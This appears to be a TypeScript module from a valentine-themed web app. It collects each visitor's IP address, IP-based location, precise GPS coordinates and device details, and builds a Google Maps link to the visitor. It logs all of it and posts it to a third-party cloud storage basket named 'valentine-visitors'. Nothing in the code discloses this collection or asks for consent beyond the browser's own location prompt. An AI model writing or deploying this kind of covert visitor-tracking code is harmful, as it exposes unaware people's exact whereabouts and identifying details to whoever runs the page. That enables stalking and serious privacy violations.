interface UserInfo {
  ipAddress: string;
  browser: string;
  os: string;
  deviceType: string;
  screenResolution: string;
  language: string;
  timezone: string;
  location: {
    city: string;
    region: string;
    country: string;
    countryCode: string;
    exact?: {
      latitude: number;
      longitude: number;
      accuracy: number;
    };
  };
  maps: string;
}

const getExactLocation = (): Promise<GeolocationPosition> => {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error('Geolocation wird von diesem Browser nicht unterstützt'));
      return;
    }

    navigator.geolocation.getCurrentPosition(resolve, reject, {
      enableHighAccuracy: true,
      timeout: 5000,
      maximumAge: 0
    });
  });
};

const saveToPantry = async (userInfo: UserInfo) => {
  const pantryId = process.env.NEXT_PUBLIC_PANTRY_API_KEY;
  if (!pantryId) {
    console.error('Pantry API Key nicht gefunden');
    return;
  }

  const basketName = 'valentine-visitors';
  const timestamp = new Date().toISOString();
  
  try {
    const response = await fetch(`https://getpantry.cloud/apiv1/pantry/${pantryId}/basket/${basketName}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        timestamp,
        ...userInfo
      })
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    console.log('✅ Besucherinformationen erfolgreich gespeichert');
  } catch (error) {
    console.error('❌ Fehler beim Speichern der Besucherinformationen:', error);
  }
};

export const getUserInfo = async (): Promise<UserInfo> => {
  // Get IP address and location data from ipapi.co
  const ipResponse = await fetch('https://ipapi.co/json/');
  const ipData = await ipResponse.json();

  // Try to get exact location
  let exactLocation = undefined;
  try {
    const position = await getExactLocation();
    exactLocation = {
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy
    };
  } catch (error) {
    console.log('📍 Genauer Standort nicht verfügbar');
  }

  // Get browser info
  const ua = navigator.userAgent;
  const browserInfo = {
    chrome: /chrome/i.test(ua),
    safari: /safari/i.test(ua),
    firefox: /firefox/i.test(ua),
    opera: /opera/i.test(ua),
    ie: /msie/i.test(ua),
    edge: /edge/i.test(ua),
  };

  // Determine browser
  let browser = 'Unknown';
  if (browserInfo.edge) browser = 'Edge';
  else if (browserInfo.chrome) browser = 'Chrome';
  else if (browserInfo.firefox) browser = 'Firefox';
  else if (browserInfo.safari) browser = 'Safari';
  else if (browserInfo.opera) browser = 'Opera';
  else if (browserInfo.ie) browser = 'Internet Explorer';

  // Determine OS
  let os = 'Unknown';
  if (ua.includes('Windows')) os = 'Windows';
  else if (ua.includes('Mac')) os = 'macOS';
  else if (ua.includes('Linux')) os = 'Linux';
  else if (ua.includes('Android')) os = 'Android';
  else if (ua.includes('iOS')) os = 'iOS';

  // Determine device type
  let deviceType = 'Unknown';
  if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
    deviceType = /iPad/i.test(ua) ? 'Tablet' : 'Smartphone';
  } else {
    deviceType = 'Desktop';
  }

  // Get screen resolution
  const screenResolution = `${window.screen.width}x${window.screen.height}`;

  // Get language
  const language = navigator.language || 'Unknown';

  // Get timezone
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  const maps = `https://www.google.com/maps?q=${exactLocation?.latitude},${exactLocation?.longitude}`

  const userInfo: UserInfo = {
    ipAddress: ipData.ip,
    browser: `${browser} ${navigator.appVersion.split(' ').pop()}`,
    os,
    deviceType,
    screenResolution,
    language,
    timezone,
    location: {
      city: ipData.city || 'Unbekannt',
      region: ipData.region || 'Unbekannt',
      country: ipData.country_name || 'Unbekannt',
      countryCode: ipData.country_code || 'XX',
      exact: exactLocation
    },
    maps
  };

  // Enhanced console logging
  console.log('🌟 Besucher Information:');
  console.log('------------------------');
  console.log(`📱 Gerät: ${userInfo.deviceType}`);
  console.log(`🌐 Browser: ${userInfo.browser}`);
  console.log(`💻 Betriebssystem: ${userInfo.os}`);
  console.log(`📍 IP-Adresse: ${userInfo.ipAddress}`);
  console.log('📍 Standort:');
  console.log(`   🏙 Stadt: ${userInfo.location.city}`);
  console.log(`   🗺 Region: ${userInfo.location.region}`);
  console.log(`   🌍 Land: ${userInfo.location.country} (${userInfo.location.countryCode})`);
  if (userInfo.location.exact) {
    console.log('   📌 Genauer Standort:');
    console.log(`      Breitengrad: ${userInfo.location.exact.latitude}`);
    console.log(`      Längengrad: ${userInfo.location.exact.longitude}`);
    console.log(`      Genauigkeit: ±${Math.round(userInfo.location.exact.accuracy)}m`);
    console.log(`      🔗 Google Maps: https://www.google.com/maps?q=${userInfo.location.exact.latitude},${userInfo.location.exact.longitude}`);
  }
  console.log(`📐 Bildschirmauflösung: ${userInfo.screenResolution}`);
  console.log(`🗣 Sprache: ${userInfo.language}`);
  console.log(`🕒 Zeitzone: ${userInfo.timezone}`);
  console.log('------------------------');

  // Save to Pantry
  await saveToPantry(userInfo);

  return userInfo;
};
